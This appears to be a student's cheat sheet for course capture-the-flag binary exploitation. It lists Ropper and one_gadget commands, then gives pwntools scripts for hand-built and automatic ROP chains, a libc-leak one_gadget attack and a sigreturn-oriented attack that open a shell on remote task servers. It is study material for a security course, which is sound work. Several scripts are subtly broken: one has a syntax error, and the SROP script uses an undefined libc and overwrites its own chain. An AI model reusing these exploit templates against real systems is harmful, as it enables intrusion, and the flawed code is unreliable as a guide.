# Stack

### Objdump explore elf if small ASM program given (instead of IDA)
- dump binary with:
```
objdump -M intel -d ./my_binary
objdump -M intel -D ./vuln
```

### Ropper (find gadgets):
- https://github.com/sashs/Ropper
- install ropper
```
sudo pip install capstone
sudo pip install filebytes
sudo pip install keystone-engine
pip install ropper
```
- find gadgets
```
ropper --file ./vuln
ropper --file ./vuln --search syscall
ropper --file ./vuln --inst-count 2 --type rop
ropper --file ./vuln --search "mov rdi, e?x" --inst-count 2 --type rop

ropper --file ./vuln --search "pop rdi; ret;" 

ropper --file ./vuln --semantic "rdi+=rax"
```
- find all gadgets interactively
```
ropper
file vuln
```
- exclude stuff
```
badbytes 0a
```
- find specific ones
```
search /1/ pop rdi
```
- find gadgets with ropper
```
search pop %; mov rdi, [rsp + %]; mov rax, [rsp + %];
```

### find the ONEGADGET
- if we jump to this gadget and fullfill the constraints, then we get shell directly
```
sudo gem install one_gadget
```
```
one_gadget ./libc.so.6
```


### build ropchain by hand
```python
import pwn
pwn.context.arch = 'amd64'
port = 1227
conn = pwn.remote('tasks.ws24.softsec.rub.de', port)

libc = pwn.ELF("./libc.so.6")

# set base address of libc, sothat later we get correct address directly (else we jsut get offset in libc)
libc.address = 0 # leak me somehow

offset_gets = libc.symbols['gets']
offset_system = libc.symbols['system']
offset_shell_string = next(libc.search(b'/bin/sh\x00'))


address_g01 = 0x0000000000403f62 # pop rdx; ret;
address_g02 = 0x000000000040d6c7 # lea rcx, [rdx + 0x558]; sub rax, rcx; sar rax, 2; ret;
address_g15 = 0x0000000000401010 # call rax;
address_fil = 0x00000000004011df # nop; ret;

rop_chain = [
    b'A'*24,
    pwn.p64(address_g01),
    pwn.p64(address_g02),
    b'A'*8,,
    pwn.p64(address_fil),
    pwn.p64(address_g15)
]

rop_chain = b''.join(gadget for gadget in rop_chain)

print(rop_chain.hex())
conn.sendline(rop_chain)
```


### build ropchain automatically
```python
import pwn
pwn.context.arch = 'amd64'
port = 1227
conn = pwn.remote('tasks.ws24.softsec.rub.de', port)

libc = pwn.ELF("./libc.so.6")

libc.address = 0 # leak me
rop = pwn.ROP(libc)
rop.call(rop.ret) # this is needed for aligned sothat syscall is 16 byte aligned
# call system, so jump to this address and set parameter beforehand
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = b'A'*(0x28) + rop.chain()
conn.sendline(payload)
```


### Trick: If PIE disabled, we can write in well-known .bss (uninitialized global writable data) (14_boromir) (or .data)
```python
import pwn
pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33586)

# one_gadget ./libc.so.6
"""
0xd509f execve("/bin/sh", rbp-0x40, r13)
constraints:
  address rbp-0x38 is writable
  rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
  [r13] == NULL || r13 == NULL || r13 is a valid envp
"""
one_gadget_offset = 0xd509f

message = conn.recvline()
printf_address = int(message[-13:-1],16)
libc_base = printf_address - libc.symbols['printf']
one_gadget = libc_base + one_gadget_offset

# we have no pie => bss is writable and at a fixed position
rbp = exe.bss(0x40)
payload = b'A'*32 + pwn.p64(rbp) + pwn.p64(one_gadget)

conn.send(payload)
conn.interactive()
```


### Sigreturn oriented programming (16 SROP)
- abuse SIGRETURN sycall, which reads stuff from the stack and puts it into the registers
- pwntools does all the heavly lifting for us:
```python
import pwn
pwn.context.arch = 'amd64'

exe = pwn.ELF("./vuln")

conn = pwn.remote('tasks.ws24.softsec.rub.de', 33595)

# Pie is off, this makes live easy :)
shell_string = next(exe.search(b'/bin/sh\x00'))

# I want to execute the following shellcode:
"""
mov rax, 59
moc rdi, 0x402029; # the address of '/bin/sh\x00'
mov rsi, 0
mov rdx, 0
syscall
"""

# found via ropper
pop_rax_gadget = 0x00000000004010b3 # pop rax; ret; 
syscall_gadget = 0x0000000000401010 # syscall;

# first we execute the syscall "SIGRETURN" (15) to setup the 4 register, then we just return to syscall again to get a shell :)

# rop.execve(next(binary.search('/bin/sh'), 0, 0))
frame = pwn.SigreturnFrame()
# do the execve syscall (this replaces this process with "bin/sh", this is a more lower level call than system() which created a new child via fork)
frame.rax = 59
frame.rdi = shell_string
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_gadget

rop = pwn.ROP(exe)
rop.raw(pop_rax_gadget)
# do the sigreturn syscall (15) (https://syscalls.mebeim.net/?table=x86/64/x64/latest)
rop.raw(15)
rop.raw(syscall_gadget)
rop.raw(bytes(frame))

rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

payload = b'A' * 208 + rop.chain()

print(f'payload length: {len(payload)}')

conn.send(payload)
conn.interactive()
```


### Shadow stack (18 magic8ball)
- we cannot return as this is checked, so just use call


